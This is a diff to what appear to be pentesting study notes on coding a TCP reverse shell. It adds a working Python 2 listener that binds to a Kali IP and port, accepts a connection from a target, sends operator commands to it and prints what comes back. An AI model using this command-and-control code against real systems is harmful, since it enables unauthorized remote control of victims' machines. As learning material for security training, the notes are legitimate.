@@ -44,8 +44,7 @@ http://bernardodamele.blogspot.ie/2011/09/reverse-shells-one-liners.html
 
 
 5 - Coding a TCP Reverse Shell
-The author has made source code available for download for creating a reverse shell, essentially creating a reverse
-shell uses the following steps
+Essentially creating a reverse shell uses the following steps
   Import socket and subprocess to create a connection and to be able to start a shell
   Define a connection
   Start a socket object 
@@ -53,6 +52,37 @@ shell uses the following steps
   Receive commands, if this is terminate then close connection
   If command received is not terminate then pass command to shell process
   Send back result or if appropriate an error
+  
+Syntax  
+# Simple TCP Server
+import socket     # For building a TCP connection
+
+def connect():
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    # start a socket object 's'
+  s.bind(("10.10.10.100", 8080))                           # define the kali IP and the listening port
+  s.listen(1)                                     # define the backlog size, since we are expecting a single connection from a single
+                                                  # target we will listen to one connection
+                                                  
+  print '[+] Listening for incoming TCP connections on port 8080'
+  conn, addr = s.accept()     # accept() function will retuen the connection object ID (conn) and will return the client(target) 
+                             #IP address and source
+                             # port in a tuple format (IP,port)
+  print '[+] We got a connection from: ', addr
+  
+  while True:
+    command = raw_input("Shell> ")    # Get user input and store it in command variable
+    if 'terminate' in command:    # If we got the terminate command, inform the client and close the connect and break the loop
+      conn.send('terminate')
+      conn.close()
+      break
+    else:
+      conn.send(command)    # Otherwise we will send the command to the target
+      print conn.recv(1024) # and print the result that we got back
+
+def main():
+  connect()
+main()
+
 
 6 - Data Exfiltration
 
